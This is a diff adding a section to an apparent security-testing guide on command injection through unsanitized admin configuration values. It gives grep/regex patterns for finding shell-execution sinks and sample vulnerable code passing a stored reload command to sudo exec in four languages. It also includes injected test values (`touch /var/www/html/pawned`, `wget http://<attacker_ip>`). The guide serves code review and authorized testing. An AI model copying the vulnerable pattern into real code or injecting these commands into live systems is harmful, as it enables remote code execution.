@@ -274,4 +274,227 @@ file=dummy.wav;`touch /var/www/html/pawned`&language=en&temporary[en]=0&filename
 
 ***
 
+#### Unsanitized Administrative Configuration Parameters Leading to Remote Code Execution
+
+{% stepper %}
+{% step %}
+Identify the target product and inspect modules that provide administrative operations, service restart functionality, Poller management, Broker management, Agent management, or system configuration processing
+{% endstep %}
+
+{% step %}
+Locate the backend files related to these functionalities and identify the paths that process administrative panel requests
+{% endstep %}
+
+{% step %}
+Trace the complete data flow from the administrative interface to the point where the command is executed on the operating system
+{% endstep %}
+
+{% step %}
+Search the source code for operating system command execution functions such as `shell_exec`, `exec`, `system`, `popen`, or their equivalents
+
+**VSCode (Regex Detection)**
+
+{% tabs %}
+{% tab title="C#" %}
+```regexp
+(ProcessStartInfo)|(Process\.Start)|(cmd\.exe)|(powershell\.exe)
+```
+{% endtab %}
+
+{% tab title="Java" %}
+```regexp
+(Runtime\.getRuntime\(\)\.exec)|(ProcessBuilder\s*\()|(getParameter\s*\()
+```
+{% endtab %}
+
+{% tab title="PHP" %}
+```regexp
+(\$_(GET|POST|REQUEST|FILES))|(exec\s*\()|(shell_exec\s*\()|(system\s*\()|(passthru\s*\()|(popen\s*\()
+```
+{% endtab %}
+
+{% tab title="Node.js" %}
+```regexp
+(child_process)|(exec\s*\()|(spawn\s*\()|(execSync\s*\()
+```
+{% endtab %}
+{% endtabs %}
+
+**RipGrep (Regex Detection(Linux))**
+
+{% tabs %}
+{% tab title="C#" %}
+```regexp
+ProcessStartInfo|Process\.Start|cmd\.exe|powershell\.exe
+```
+{% endtab %}
+
+{% tab title="Java" %}
+```regexp
+Runtime\.getRuntime\(\)\.exec|ProcessBuilder\s*\(|getParameter\s*\(
+```
+{% endtab %}
+
+{% tab title="PHP" %}
+```regexp
+\$_(GET|POST|REQUEST|FILES)|exec\s*\(|shell_exec\s*\(|system\s*\(|passthru\s*\(|popen\s*\(
+```
+{% endtab %}
+
+{% tab title="Node.js" %}
+```regexp
+child_process|exec\s*\(|spawn\s*\(|execSync\s*\(
+```
+{% endtab %}
+{% endtabs %}
+
+**Vulnerable Code Pattern**
+
+{% tabs %}
+{% tab title="C#" %}
+```csharp
+void Reload()
+{
+    if ((command = this.GetReloadCommand()) != null) {
+     // vulnerable code !!!   
+     System.Diagnostics.Process.Start("sudo " + command);
+    }
+}
+```
+{% endtab %}
+
+{% tab title="Java" %}
+```java
+void reload()
+{
+    if ((command = this.getReloadCommand()) != null) {
+     // vulnerable code !!!   
+     Runtime.getRuntime().exec("sudo " + command);
+    }
+}
+```
+{% endtab %}
+
+{% tab title="PHP" %}
+```php
+function reload()
+{
+   if ($command = $this->getReloadCommand()) {
+   // vulnerable code !!!
+   shell_exec("sudo " . $command);
+}
+```
+{% endtab %}
+
+{% tab title="Node.js" %}
+```javascript
+const { exec } = require('child_process');
+
+function reload()
+{
+    if (command = this.getReloadCommand()) {
+     // vulnerable code !!!   
+     exec("sudo " + command);
+    }
+}
+```
+{% endtab %}
+{% endtabs %}
+{% endstep %}
+
+{% step %}
+Check whether values received from the database, administrative settings, or user requests are directly inserted into shell commands
+
+{% tabs %}
+{% tab title="C#" %}
+```csharp
+private string GetReloadCommand()
+{
+    string command = null;
+
+    var result = this.db.Query(
+        "SELECT broker_reload_command " +
+        "FROM nagios_server " +
+        "ORDER BY localhost DESC"
+    );
+
+    if ((row = result.Fetch()) != null) {
+        command = row["broker_reload_command"];
+    }
+
+    return command;
+}
+```
+{% endtab %}
+
+{% tab title="Java" %}
+```java
+private String getReloadCommand()
+{
+    String command = null;
+
+    var result = this.db.query(
+        "SELECT broker_reload_command " +
+        "FROM nagios_server " +
+        "ORDER BY localhost DESC"
+    );
+
+    if ((row = result.fetch()) != null) {
+        command = row["broker_reload_command"];
+    }
+
+    return command;
+}
+```
+{% endtab %}
+
+{% tab title="PHP" %}
+```php
+private function getReloadCommand(): ?string
+{
+    $command = null;
+
+    $result = $this->db->query(
+        'SELECT broker_reload_command
+        FROM nagios_server
+        ORDER BY localhost DESC'
+    );
+
+if ($row = $result->fetch()) {
+        $command = $row['broker_reload_command'];
+    }
+
+return $command;
+}
+```
+{% endtab %}
+
+{% tab title="Node.js" %}
+```javascript
+function getReloadCommand()
+{
+    let command = null;
+
+    let result = this.db.query(
+        'SELECT broker_reload_command ' +
+        'FROM nagios_server ' +
+        'ORDER BY localhost DESC'
+    );
+
+    if (row = result.fetch()) {
+        command = row['broker_reload_command'];
+    }
+
+    return command;
+}
+```
+{% endtab %}
+{% endtabs %}
+{% endstep %}
+
+{% step %}
+Then verify whether input validation or filtering is absent. Set up a local server and send the request using the system command `wget http://<attacker_ip>` in the input
+{% endstep %}
+{% endstepper %}
+
 ## Cheat Sheet
